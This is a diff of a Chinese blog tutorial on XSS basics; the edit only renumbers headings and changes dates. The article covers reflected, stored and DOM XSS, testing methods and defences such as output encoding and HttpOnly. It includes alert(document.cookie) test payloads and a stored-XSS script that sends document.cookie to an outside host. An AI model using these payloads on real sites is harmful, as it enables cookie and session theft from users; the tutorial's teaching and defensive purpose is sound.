@@ -55,18 +55,18 @@
   };
 </script>
 
-  <meta name="description" content="一、JavaScript相关语法（一）基础语法123写在[removed][removed]标签中变量定义：var xxx.的用处：连接字符（二）wiondow.open()：是window对象中的open()方法12345而window对象是javascript中的顶层对象，代表一个浏览器窗口 在&amp;amp;lt;body&amp;gt;或&amp;amp;lt;frameset&amp;gt;每次出现时被自动创建 op">
+  <meta name="description" content="0x01 JavaScript相关语法1 基础语法123写在[removed][removed]标签中变量定义：var xxx.的用处：连接字符2 wiondow.open()：是window对象中的open()方法12345而window对象是javascript中的顶层对象，代表一个浏览器窗口 在&amp;amp;lt;body&amp;gt;或&amp;amp;lt;frameset&amp;gt;每次出现时被自动创建 o">
 <meta name="keywords" content="XSS">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Web安全—XSS基础">
 <meta property="og:url" content="https://github.com/xx-C1/xx-C1.github.io/2018/07/08/Web安全—XSS基础/index.html">
 <meta property="og:site_name" content="xxC1&#39;s blog">
-<meta property="og:description" content="一、JavaScript相关语法（一）基础语法123写在[removed][removed]标签中变量定义：var xxx.的用处：连接字符（二）wiondow.open()：是window对象中的open()方法12345而window对象是javascript中的顶层对象，代表一个浏览器窗口 在&amp;amp;lt;body&amp;gt;或&amp;amp;lt;frameset&amp;gt;每次出现时被自动创建 op">
+<meta property="og:description" content="0x01 JavaScript相关语法1 基础语法123写在[removed][removed]标签中变量定义：var xxx.的用处：连接字符2 wiondow.open()：是window对象中的open()方法12345而window对象是javascript中的顶层对象，代表一个浏览器窗口 在&amp;amp;lt;body&amp;gt;或&amp;amp;lt;frameset&amp;gt;每次出现时被自动创建 o">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2021-01-18T07:23:21.912Z">
+<meta property="og:updated_time" content="2021-04-11T02:50:05.479Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Web安全—XSS基础">
-<meta name="twitter:description" content="一、JavaScript相关语法（一）基础语法123写在[removed][removed]标签中变量定义：var xxx.的用处：连接字符（二）wiondow.open()：是window对象中的open()方法12345而window对象是javascript中的顶层对象，代表一个浏览器窗口 在&amp;amp;lt;body&amp;gt;或&amp;amp;lt;frameset&amp;gt;每次出现时被自动创建 op">
+<meta name="twitter:description" content="0x01 JavaScript相关语法1 基础语法123写在[removed][removed]标签中变量定义：var xxx.的用处：连接字符2 wiondow.open()：是window对象中的open()方法12345而window对象是javascript中的顶层对象，代表一个浏览器窗口 在&amp;amp;lt;body&amp;gt;或&amp;amp;lt;frameset&amp;gt;每次出现时被自动创建 o">
   <link rel="canonical" href="https://github.com/xx-C1/xx-C1.github.io/2018/07/08/Web安全—XSS基础/">
 
 
@@ -294,7 +294,7 @@
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-01-18 15:23:21" itemprop="dateModified" datetime="2021-01-18T15:23:21+08:00">2021-01-18</time>
+                <time title="修改时间：2021-04-11 10:50:05" itemprop="dateModified" datetime="2021-04-11T10:50:05+08:00">2021-04-11</time>
               </span>
             
           
@@ -343,7 +343,7 @@
               
                 <span class="post-meta-item-text">本文字数：</span>
               
-              <span>6.5k</span>
+              <span>6.6k</span>
             </span>
           
             <span class="post-meta-item" title="阅读时长">
@@ -366,7 +366,7 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h3 id="一、JavaScript相关语法"><a href="#一、JavaScript相关语法" class="headerlink" title="一、JavaScript相关语法"></a>一、JavaScript相关语法</h3><h4 id="（一）基础语法"><a href="#（一）基础语法" class="headerlink" title="（一）基础语法"></a><strong>（一）基础语法</strong></h4><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">写在[<span class="string">removed</span>][<span class="symbol">removed</span>]标签中</span><br><span class="line">变量定义：var xxx</span><br><span class="line">.的用处：连接字符</span><br></pre></td></tr></table></figure><h4 id="（二）wiondow-open-：是window对象中的open-方法"><a href="#（二）wiondow-open-：是window对象中的open-方法" class="headerlink" title="（二）wiondow.open()：是window对象中的open()方法"></a><strong>（二）wiondow.open()：是window对象中的open()方法</strong></h4><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">而<span class="built_in">window</span>对象是javascript中的顶层对象，代表一个浏览器窗口</span><br><span class="line"> </span><br><span class="line">在&amp;<span class="keyword">lt</span>;body&gt;或&amp;<span class="keyword">lt</span>;frameset&gt;每次出现时被自动创建</span><br><span class="line"> </span><br><span class="line"><span class="keyword">open</span>()方法用于打开一个新的浏览器窗口或查找一个已命名的窗口</span><br></pre></td></tr></table></figure><a id="more"></a> 
+        <h3 id="0x01-JavaScript相关语法"><a href="#0x01-JavaScript相关语法" class="headerlink" title="0x01 JavaScript相关语法"></a>0x01 JavaScript相关语法</h3><h4 id="1-基础语法"><a href="#1-基础语法" class="headerlink" title="1 基础语法"></a><strong>1 基础语法</strong></h4><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">写在[<span class="string">removed</span>][<span class="symbol">removed</span>]标签中</span><br><span class="line">变量定义：var xxx</span><br><span class="line">.的用处：连接字符</span><br></pre></td></tr></table></figure><h4 id="2-wiondow-open-：是window对象中的open-方法"><a href="#2-wiondow-open-：是window对象中的open-方法" class="headerlink" title="2 wiondow.open()：是window对象中的open()方法"></a><strong>2 wiondow.open()：是window对象中的open()方法</strong></h4><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">而<span class="built_in">window</span>对象是javascript中的顶层对象，代表一个浏览器窗口</span><br><span class="line"> </span><br><span class="line">在&amp;<span class="keyword">lt</span>;body&gt;或&amp;<span class="keyword">lt</span>;frameset&gt;每次出现时被自动创建</span><br><span class="line"> </span><br><span class="line"><span class="keyword">open</span>()方法用于打开一个新的浏览器窗口或查找一个已命名的窗口</span><br></pre></td></tr></table></figure><a id="more"></a> 
 
 
 
@@ -374,29 +374,29 @@
 
 
 
-<h4 id="（三）document-password-pass-value"><a href="#（三）document-password-pass-value" class="headerlink" title="（三）document.password.pass.value"></a><strong>（三）document.password.pass.value</strong></h4> <figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">document是javascript里面的文档对象，里面含有很多的属性和方法，而value值就是属性。</span><br><span class="line"></span><br><span class="line">在这里是获得password<span class="selector-class">.password</span><span class="selector-class">.pass</span><span class="selector-class">.value</span>的值。</span><br></pre></td></tr></table></figure>
+<h4 id="3-document-password-pass-value"><a href="#3-document-password-pass-value" class="headerlink" title="3 document.password.pass.value"></a><strong>3 document.password.pass.value</strong></h4> <figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">document是javascript里面的文档对象，里面含有很多的属性和方法，而value值就是属性。</span><br><span class="line"></span><br><span class="line">在这里是获得password<span class="selector-class">.password</span><span class="selector-class">.pass</span><span class="selector-class">.value</span>的值。</span><br></pre></td></tr></table></figure>
 
-<h4 id="（四）javascript-alert"><a href="#（四）javascript-alert" class="headerlink" title="（四）javascript alert()"></a><strong>（四）javascript</strong> <strong>alert()</strong></h4> <figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">警示对话框</span><br><span class="line">  函数括号内的文本信息显示在对话框中，把它称为警示对话框，要显示的信息放置在括号内，该对画框包含一个确认<span class="string">"确认"</span>按钮。用户阅读完之后所显示的信息后，只需要点击该按钮就可以关闭对话框，在这里就是一个弹出框。</span><br></pre></td></tr></table></figure>
+<h4 id="4-javascript-alert"><a href="#4-javascript-alert" class="headerlink" title="4 javascript alert()"></a><strong>4 javascript</strong> <strong>alert()</strong></h4> <figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">警示对话框</span><br><span class="line">  函数括号内的文本信息显示在对话框中，把它称为警示对话框，要显示的信息放置在括号内，该对画框包含一个确认<span class="string">"确认"</span>按钮。用户阅读完之后所显示的信息后，只需要点击该按钮就可以关闭对话框，在这里就是一个弹出框。</span><br></pre></td></tr></table></figure>
 
 
 
-<h3 id="二、XSS定义"><a href="#二、XSS定义" class="headerlink" title="二、XSS定义"></a>二、XSS定义</h3><ul>
+<h3 id="0x02-XSS定义"><a href="#0x02-XSS定义" class="headerlink" title="0x02 XSS定义"></a>0x02 XSS定义</h3><ul>
 <li>跨站脚本攻击(Cross Site Scripting)，缩写为XSS。</li>
 <li>恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。</li>
 <li>这些恶意网页程序通常是JavaScript，但实际上也可以包括Java，VBScript，ActiveX，Flash或者甚至是普通的HTML</li>
 <li>攻击成功后，攻击者可能得到更高的权限（如执行一些操作）、私密网页内容、会话和cookie等各种内容</li>
 </ul>
-<h3 id="三、-XSS的原理"><a href="#三、-XSS的原理" class="headerlink" title="三、 XSS的原理"></a><strong>三、 XSS的原理</strong></h3><ul>
+<h3 id="0x03-XSS的原理"><a href="#0x03-XSS的原理" class="headerlink" title="0x03  XSS的原理"></a><strong>0x03  XSS的原理</strong></h3><ul>
 <li><strong>攻击者对含有漏洞的服务器发起XSS攻击（注入JS代码）</strong></li>
 <li><strong>诱使受害者打开受到攻击的服务器URL</strong></li>
 <li><strong>受害者在Web浏览器中打开URL，恶意脚本执行</strong></li>
 </ul>
-<h3 id="四、XSS的攻击方式"><a href="#四、XSS的攻击方式" class="headerlink" title="四、XSS的攻击方式"></a><strong>四、XSS的攻击方式</strong></h3><h4 id="（一）反射型"><a href="#（一）反射型" class="headerlink" title="（一）反射型"></a><strong>（一）反射型</strong></h4><ul>
+<h3 id="0x04-XSS的攻击方式"><a href="#0x04-XSS的攻击方式" class="headerlink" title="0x04 XSS的攻击方式"></a><strong>0x04 XSS的攻击方式</strong></h3><h4 id="1-反射型"><a href="#1-反射型" class="headerlink" title="1 反射型"></a><strong>1 反射型</strong></h4><ul>
 <li>DOM Based XSS是一种基于网页DOM结构的攻击，该攻击特点是中招的人是少数人。</li>
 <li>发送请求时，XSS代码出现在URL中(反射型的典型特征)，作为输入提交到服务器端，服务器端解析后响应(search中包含XSS代码，可以是js或者HTML或者CSS)，XSS代码随着响应内容一起传回浏览器，最后浏览器解析执行XSS代码，这个过程像一个反射，所以叫做反射型XSS。</li>
 <li>注入代码是从目标服务器通过错误信息、搜索结果等等方式“反射”回来的而称为非持久型XSS，则是因为这种攻击方式具有一次性。</li>
 </ul>
-<h5 id="场景一"><a href="#场景一" class="headerlink" title="场景一"></a><strong>场景一</strong></h5><ul>
+<h4 id="场景一"><a href="#场景一" class="headerlink" title="场景一"></a><strong>场景一</strong></h4><ul>
 <li>当我登录a.com后，我发现它的页面某些内容是根据url中的一个叫content参数直接显示的，猜测它测页面处理可能是这样，其它语言类似：</li>
 </ul>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">%@</span> <span class="attr">page</span> <span class="attr">language</span>=<span class="string">"java"</span><span class="attr">contentType</span>=<span class="string">"text/html; charset=UTF-8"</span> <span class="attr">pageEncoding</span>=<span class="string">"UTF-8"</span>%&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPEhtmlPUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN""http://www.w3.org/TR/html4/loose.dtd"&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>XSS测试<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">页面内容：<span class="tag">&lt;<span class="name">%=request.getParameter("content")%</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
@@ -419,11 +419,11 @@
 <ul>
 <li>浏览器展示页面内容的过程中，就会执行我的脚本，页面输出xss字样，这是攻击了我自己。</li>
 </ul>
-<h4 id="（二）存储型（Stored-XSS）"><a href="#（二）存储型（Stored-XSS）" class="headerlink" title="（二）存储型（Stored XSS）"></a><strong>（二）存储型（</strong>Stored XSS）</h4><ul>
+<h4 id="2-存储型（Stored-XSS）"><a href="#2-存储型（Stored-XSS）" class="headerlink" title="2 存储型（Stored XSS）"></a><strong>2 存储型（</strong>Stored XSS）</h4><ul>
 <li>存储型XSS和反射型的XSS差别就在于，<strong>存储型的XSS提交的代码会存储在服务器端（数据库，内存，文件系统等），下次请求目标页面时不用再提交XSS代码。</strong></li>
 <li>这种攻击多见于论坛<strong>，</strong>攻击者在发帖的过程中</li>
 </ul>
-<h5 id="场景二"><a href="#场景二" class="headerlink" title="场景二"></a><strong>场景二</strong></h5><ul>
+<h4 id="场景二"><a href="#场景二" class="headerlink" title="场景二"></a><strong>场景二</strong></h4><ul>
 <li>a.com可以发文章， 我登录后在a.com中发布了一篇文章，文章中包含了恶意代码：</li>
 </ul>
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">window</span>.open(“www.b.com?param=”+<span class="built_in">document</span>.cookie)&lt; <span class="regexp">/script&gt;</span></span></span><br></pre></td></tr></table></figure>
@@ -436,7 +436,7 @@
 <li><p>Stored XSS漏洞危害性更大，危害面更广</p>
 </li>
 </ul>
-<h4 id="（三）DOM（Document-object-model）型XSS"><a href="#（三）DOM（Document-object-model）型XSS" class="headerlink" title="（三）DOM（Document object model）型XSS"></a><strong>（三）DOM（</strong>Document object model）型XSS</h4><ul>
+<h4 id="4-DOM（Document-object-model）型XSS"><a href="#4-DOM（Document-object-model）型XSS" class="headerlink" title="4 DOM（Document object model）型XSS"></a><strong>4 DOM（</strong>Document object model）型XSS</h4><ul>
 <li><p>其实是一种特殊类型的反射型XSS，它是基于DOM文档对象的一种漏洞。DOM型XSS是基于js上的。不需要与服务器进行交互</p>
 </li>
 <li><p>传统的 XSS 漏洞一般出现在服务器端代码中，而 DOM-Based XSS 是基于 DOM 文档对象模型的一种漏洞。所以，受客户端浏览器的脚本代码所影响。</p>
@@ -449,7 +449,7 @@
 </ul>
 </li>
 </ul>
-<h3 id="五、XSS漏洞测试"><a href="#五、XSS漏洞测试" class="headerlink" title="五、XSS漏洞测试"></a><strong>五、XSS漏洞测试</strong></h3><h4 id="（一）方法一"><a href="#（一）方法一" class="headerlink" title="（一）方法一"></a><strong>（一）方法一</strong></h4><ul>
+<h3 id="0x05-XSS漏洞测试"><a href="#0x05-XSS漏洞测试" class="headerlink" title="0x05 XSS漏洞测试"></a><strong>0x05 XSS漏洞测试</strong></h3><h4 id="1-方法一"><a href="#1-方法一" class="headerlink" title="1 方法一"></a><strong>1 方法一</strong></h4><ul>
 <li><p>查看代码，查找关键的变量,  客户端将数据传送给Web 服务端一般通过三种方式</p>
 </li>
 <li><ul>
@@ -466,7 +466,7 @@
 <ul>
 <li><strong>假如变量没有经过htmlEncode处理， 那么这个变量就存在一个XSS漏洞</strong></li>
 </ul>
-<h4 id="（二）方法二"><a href="#（二）方法二" class="headerlink" title="（二）方法二"></a><strong>（二）方法二</strong></h4><ul>
+<h4 id="2-方法二"><a href="#2-方法二" class="headerlink" title="2 方法二"></a><strong>2 方法二</strong></h4><ul>
 <li>准备测试脚本</li>
 </ul>
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">"/&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="built_in">document</span>.cookie)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;!--</span></span><br><span class="line"><span class="comment">"onclick="alert(document.cookie)</span></span><br></pre></td></tr></table></figure>
@@ -475,12 +475,12 @@
 <li>在网页中的Textbox或者其他能输入数据的地方，输入这些测试脚本， 看能不能弹出对话框，能弹出的话说明存在XSS漏洞</li>
 <li>在URL中查看有那些变量通过URL把值传给Web服务器， 把这些变量的值退换成我们的测试的脚本。 然后看我们的脚本是否能执行</li>
 </ul>
-<h4 id="（三）方法三"><a href="#（三）方法三" class="headerlink" title="（三）方法三"></a><strong>（三）方法三</strong></h4><ul>
+<h4 id="3-方法三"><a href="#3-方法三" class="headerlink" title="3 方法三"></a><strong>3 方法三</strong></h4><ul>
 <li>自动化测试XSS漏洞或者工具测试</li>
 <li>现在已经有很多XSS扫描工具了。 实现XSS自动化测试非常简单，只需要用HttpWebRequest类。</li>
 <li>把包含xss 测试脚本。发送给Web服务器。 然后查看HttpWebResponse中，我们的XSS测试脚本是否已经注入进去了</li>
 </ul>
-<h3 id="六、攻击方式"><a href="#六、攻击方式" class="headerlink" title="六、攻击方式"></a><strong>六、攻击方式</strong></h3><h4 id="常见容易出现XSS漏洞的地方"><a href="#常见容易出现XSS漏洞的地方" class="headerlink" title="常见容易出现XSS漏洞的地方"></a>常见容易出现XSS漏洞的地方</h4><h5 id="1-数据交互的地方"><a href="#1-数据交互的地方" class="headerlink" title="1.数据交互的地方"></a><strong>1.数据交互的地方</strong></h5><ul>
+<h3 id="0x06-攻击方式"><a href="#0x06-攻击方式" class="headerlink" title="0x06 攻击方式"></a><strong>0x06 攻击方式</strong></h3><h4 id="常见容易出现XSS漏洞的地方"><a href="#常见容易出现XSS漏洞的地方" class="headerlink" title="常见容易出现XSS漏洞的地方"></a>常见容易出现XSS漏洞的地方</h4><h5 id="1-数据交互的地方"><a href="#1-数据交互的地方" class="headerlink" title="1.数据交互的地方"></a><strong>1.数据交互的地方</strong></h5><ul>
 <li>get、post、cookies、headers</li>
 <li>反馈与浏览</li>
 <li>富文本编辑器</li>
@@ -498,7 +498,7 @@
 <li><p>存储型XSS测试点：论坛、博客、留言板、网站的留言、评论、日志等交互处</p>
 </li>
 </ul>
-<h4 id="（一）反射性XSS"><a href="#（一）反射性XSS" class="headerlink" title="（一）反射性XSS"></a><strong>（一）反射性XSS</strong></h4><ul>
+<h4 id="1-反射性XSS"><a href="#1-反射性XSS" class="headerlink" title="1 反射性XSS"></a><strong>1 反射性XSS</strong></h4><ul>
 <li><p><strong>1.常见注入点</strong></p>
 <ul>
 <li>网站的搜索栏、用户登录入口、输入表单等地方</li>
@@ -511,7 +511,7 @@
 </ul>
 </li>
 </ul>
-<h4 id="（二）存储型XSS"><a href="#（二）存储型XSS" class="headerlink" title="（二）存储型XSS"></a><strong>（二）存储型XSS</strong></h4><ul>
+<h4 id="2-存储型XSS"><a href="#2-存储型XSS" class="headerlink" title="2 存储型XSS"></a><strong>2 存储型XSS</strong></h4><ul>
 <li><strong>1.常见注入点</strong><ul>
 <li>论坛、博客、留言板、网站的留言、评论、日志等交互处</li>
 </ul>
@@ -522,7 +522,7 @@
 </ul>
 </li>
 </ul>
-<h4 id="（三）DOM型XSS"><a href="#（三）DOM型XSS" class="headerlink" title="（三）DOM型XSS"></a><strong>（三）DOM型XSS</strong></h4><ul>
+<h4 id="3-DOM型XSS"><a href="#3-DOM型XSS" class="headerlink" title="3 DOM型XSS"></a><strong>3 DOM型XSS</strong></h4><ul>
 <li><p><strong>1.常见注入点</strong></p>
 <ul>
 <li>通过js脚本对对文档对象进行编辑，从而修改页面的元素。也就是说，客户端的脚本程序可以DOM动态修改页面的内容，从客户端获取DOM中的数据并在本地执行。由于DOM是在客户端修改节点的，所以基于DOM型的XSS漏洞不需要与服务器d端交互，它只发生在客户端处理数据的阶段。</li>
@@ -533,7 +533,7 @@
 <li><p>用户请求一个经过专门设计的URL，它由攻击者提供，而且其中包含XSS代码。服务器的响应不会以任何形式包含攻击者的脚本，当用户的浏览器处理这个响应时，DOM对象就会处理XSS代码，导致存在XSS漏洞。</p>
 </li>
 </ul>
-<h3 id="七、XSS安全性分析"><a href="#七、XSS安全性分析" class="headerlink" title="七、XSS安全性分析"></a><strong>七、XSS安全性分析</strong></h3><h5 id="（一）首先要明确的是，在受害者的浏览器中执行脚本的能力算不上特别恶意"><a href="#（一）首先要明确的是，在受害者的浏览器中执行脚本的能力算不上特别恶意" class="headerlink" title="（一）首先要明确的是，在受害者的浏览器中执行脚本的能力算不上特别恶意"></a><strong>（一）首先要明确的是，在受害者的浏览器中执行脚本的能力算不上特别恶意</strong></h5><ul>
+<h3 id="0x07-XSS安全性分析"><a href="#0x07-XSS安全性分析" class="headerlink" title="0x07 XSS安全性分析"></a><strong>0x07 XSS安全性分析</strong></h3><h5 id="（一）首先要明确的是，在受害者的浏览器中执行脚本的能力算不上特别恶意"><a href="#（一）首先要明确的是，在受害者的浏览器中执行脚本的能力算不上特别恶意" class="headerlink" title="（一）首先要明确的是，在受害者的浏览器中执行脚本的能力算不上特别恶意"></a><strong>（一）首先要明确的是，在受害者的浏览器中执行脚本的能力算不上特别恶意</strong></h5><ul>
 <li>js的执行环境受到严格限制并只有非常有限的权限访问用户的文件和操作系统。</li>
 <li>事实上，现在就可以打开浏览器的脚本控制台立刻执行任何你想执行的脚本，几乎不可能对你的电脑造成任何的伤害。</li>
 <li>但是恶意脚本有以下的权限<ul>
@@ -562,12 +562,12 @@
 </ul>
 </li>
 </ul>
-<h3 id="八、XSS的防御措施"><a href="#八、XSS的防御措施" class="headerlink" title="八、XSS的防御措施"></a><strong>八、XSS的防御措施</strong></h3><h4 id="（一）调用函数"><a href="#（一）调用函数" class="headerlink" title="（一）调用函数"></a><strong>（一）调用函数</strong></h4><ul>
+<h3 id="0x08-XSS的防御措施"><a href="#0x08-XSS的防御措施" class="headerlink" title="0x08 XSS的防御措施"></a><strong>0x08 XSS的防御措施</strong></h3><h4 id="1-调用函数"><a href="#1-调用函数" class="headerlink" title="1 调用函数"></a><strong>1 调用函数</strong></h4><ul>
 <li>对于用户提交的数据可以通过调用函数进行过滤</li>
 <li>htmlspecialchars()函数将输出的内容进行HTML的编码，效果最好</li>
 <li>str_replace()函数可以将指定的字符串转换为其他字符串的，但是会被绕过</li>
 </ul>
-<h4 id="（二）使用XSS-Filter"><a href="#（二）使用XSS-Filter" class="headerlink" title="（二）使用XSS Filter"></a><strong>（二）使用XSS Filter</strong></h4><h5 id="（1）输入过滤"><a href="#（1）输入过滤" class="headerlink" title="（1）输入过滤"></a><strong>（1）输入过滤</strong></h5><ul>
+<h4 id="2-使用XSS-Filter"><a href="#2-使用XSS-Filter" class="headerlink" title="2 使用XSS Filter"></a><strong>2 使用XSS Filter</strong></h4><h5 id="（1）输入过滤"><a href="#（1）输入过滤" class="headerlink" title="（1）输入过滤"></a><strong>（1）输入过滤</strong></h5><ul>
 <li><strong>输入验证（客户端）：</strong>前端JS过滤，如检测最大长度、是否只有合法字符、格式是否符合要求、数字是否在指定的范围内。</li>
 <li>缺点：容易被修改掉。</li>
 <li><strong>数据消毒（服务器端）：</strong>过滤敏感字符（可以和SQL注入的一同过滤）<ul>
@@ -586,13 +586,13 @@
 </ul>
 <figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="params">&lt;  <span class="variable">&amp;lt</span>;  &amp;#<span class="number">60</span>；</span></span><br><span class="line"><span class="params">&gt;</span>  <span class="variable">&amp;gt</span>;  &amp;<span class="meta">#62；</span></span><br><span class="line">&amp;  <span class="variable">&amp;amp</span>;  &amp;<span class="meta">#38；</span></span><br><span class="line">“  <span class="variable">&amp;quot</span>;  &amp;<span class="meta">#34；</span></span><br><span class="line">‘          &amp;<span class="meta">#39;</span></span><br></pre></td></tr></table></figure>
 
-<h4 id="（三）白名单和黑名单结合"><a href="#（三）白名单和黑名单结合" class="headerlink" title="（三）白名单和黑名单结合"></a><strong>（三）白名单和黑名单结合</strong></h4><h4 id="（四）Noscript"><a href="#（四）Noscript" class="headerlink" title="（四）Noscript"></a><strong>（四）Noscript</strong></h4><ul>
+<h4 id="3-白名单和黑名单结合"><a href="#3-白名单和黑名单结合" class="headerlink" title="3 白名单和黑名单结合"></a><strong>3 白名单和黑名单结合</strong></h4><h4 id="4-Noscript"><a href="#4-Noscript" class="headerlink" title="4 Noscript"></a><strong>4 Noscript</strong></h4><ul>
 <li><strong>Firefox的一款免费的开源插件，默认禁止所有脚本，但是可以通过自定义设置允许通过的脚本</strong></li>
 </ul>
-<h4 id="（五）Anti-XSS"><a href="#（五）Anti-XSS" class="headerlink" title="（五）Anti_XSS"></a><strong>（五）Anti_XSS</strong></h4><ul>
+<h4 id="5-Anti-XSS"><a href="#5-Anti-XSS" class="headerlink" title="5 Anti_XSS"></a><strong>5 Anti_XSS</strong></h4><ul>
 <li><strong>提供大量的编码函数用于处理用户的输入，实现白名单机制和输出转义</strong></li>
 </ul>
-<h4 id="（六）HttpOnly"><a href="#（六）HttpOnly" class="headerlink" title="（六）HttpOnly"></a><strong>（六）HttpOnly</strong></h4><ul>
+<h4 id="6-HttpOnly"><a href="#6-HttpOnly" class="headerlink" title="6 HttpOnly"></a><strong>6 HttpOnly</strong></h4><ul>
 <li><p>攻击者通过XSS漏洞执行JS中的document.cookie方法来窃取用户的cookie信息。Web应用程序在Set-Cookie时将其属性设为HttpOnly即可避免Cookie被客户端JS存取，也可以保护用户的Cookie信息不被盗取。</p>
 </li>
 <li><p><strong>PHP设置HttpOnly的方法：</strong></p>
@@ -600,10 +600,10 @@
 
 </li>
 </ul>
-<h4 id="（七）Web安全编码规范"><a href="#（七）Web安全编码规范" class="headerlink" title="（七）Web安全编码规范"></a><strong>（七）Web安全编码规范</strong></h4><ul>
+<h4 id="7-Web安全编码规范"><a href="#7-Web安全编码规范" class="headerlink" title="7 Web安全编码规范"></a><strong>7 Web安全编码规范</strong></h4><ul>
 <li><strong>对敏感字符转义、URL属性进行相应的规定等</strong></li>
 </ul>
-<h4 id="（八）尽量使用WAF"><a href="#（八）尽量使用WAF" class="headerlink" title="（八）尽量使用WAF"></a><strong>（八）尽量使用WAF</strong></h4><h4 id="（九）防御DOM型XSS"><a href="#（九）防御DOM型XSS" class="headerlink" title="（九）防御DOM型XSS"></a><strong>（九）防御DOM型XSS</strong></h4><ul>
+<h4 id="8-尽量使用WAF"><a href="#8-尽量使用WAF" class="headerlink" title="8 尽量使用WAF"></a><strong>8 尽量使用WAF</strong></h4><h4 id="9-防御DOM型XSS"><a href="#9-防御DOM型XSS" class="headerlink" title="9 防御DOM型XSS"></a><strong>9 防御DOM型XSS</strong></h4><ul>
 <li>DOM型XSS主要是由客户端的脚本通过DOM动态地输出数据到页面而不是依赖于将数据提交给服务器端，而从客户端获得DOM中的数据在本地执行，因而仅从服务器端是无法防御的。</li>
 <li>其防御在于：<ul>
 <li>（1） 避免客户端文档重写、重定向或其他敏感操作，同时避免使用客户端数据，这些操作尽量在服务器端使用动态页面来实现；</li>
@@ -611,7 +611,7 @@
 </ul>
 </li>
 </ul>
-<h4 id="（十）ASP-NET中的XSS安全机制"><a href="#（十）ASP-NET中的XSS安全机制" class="headerlink" title="（十）ASP.NET中的XSS安全机制"></a><strong>（十）ASP.NET中的XSS安全机制</strong></h4><ul>
+<h4 id="10-ASP-NET中的XSS安全机制"><a href="#10-ASP-NET中的XSS安全机制" class="headerlink" title="10 ASP.NET中的XSS安全机制"></a><strong>10 ASP.NET中的XSS安全机制</strong></h4><ul>
 <li><p>ASP.NET中有防范XSS的机制，对提交的表单会自动检查是否存在XSS，当用户试图输入XSS代码的时候，ASP.NET会抛出一个错误</p>
 </li>
 <li><p>很多程序员对安全没有概念， 甚至不知道有XSS的存在。 ASP.NET在这一点上做到默认安全。 这样的话就算是没有安全意识的程序员也能写出一个”较安全的网站“。</p>
@@ -750,7 +750,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#一、JavaScript相关语法"><span class="nav-text">一、JavaScript相关语法</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#（一）基础语法"><span class="nav-text">（一）基础语法</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#（二）wiondow-open-：是window对象中的open-方法"><span class="nav-text">（二）wiondow.open()：是window对象中的open()方法</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#（三）document-password-pass-value"><span class="nav-text">（三）document.password.pass.value</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#（四）javascript-alert"><span class="nav-text">（四）javascript 